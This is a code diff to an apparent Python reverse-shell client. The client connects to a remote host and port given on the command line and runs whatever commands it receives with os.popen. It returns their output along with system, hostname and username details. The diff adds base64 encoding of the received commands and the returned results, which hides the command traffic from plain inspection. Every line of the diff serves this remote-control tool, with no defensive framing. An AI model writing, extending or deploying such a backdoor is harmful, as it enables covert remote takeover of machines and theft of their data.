@@ -28,6 +28,7 @@ import socket
 import sys
 import platform
 import getpass
+import base64
 
 try:
     RHOST = str(sys.argv[1])
@@ -37,8 +38,22 @@ except:
     RHOST = '127.0.0.1'
     RPORT = 7261
 
+def encode(plain_message):
+
+    plain_message_bytes = plain_message.encode('ascii')
+    base64_message_bytes = base64.b64encode(plain_message_bytes)
+    base64_message = base64_message_bytes.decode('ascii')
+    return base64_message
+
+def decode(base64_message):
+
+    base64_message_bytes = base64_message.encode('ascii')
+    plain_message_bytes = base64.b64decode(base64_message_bytes)
+    plain_message = plain_message_bytes.decode('ascii')
+    return plain_message
+
 def main():
-    
+
     try:
         s = socket.socket()
         s.connect((RHOST, RPORT))
@@ -47,7 +62,7 @@ def main():
 
     while True:
         data = s.recv(1024)
-        cmd = data
+        cmd = decode(data)
 
         # stop client
         if cmd == 'quit':
@@ -58,11 +73,11 @@ def main():
             results = '{}|{}|{}|{}|{}'.format(platform.system(),
             platform.node(),getpass.getuser(),platform.release(),
             platform.processor())
-            s.sendall(results)
+            s.sendall(encode(results))
         # any other command
         else:
             results = os.popen(cmd).read()
-            s.sendall(results)
+            s.sendall(encode(results))
 
 if __name__ == '__main__':
     main()
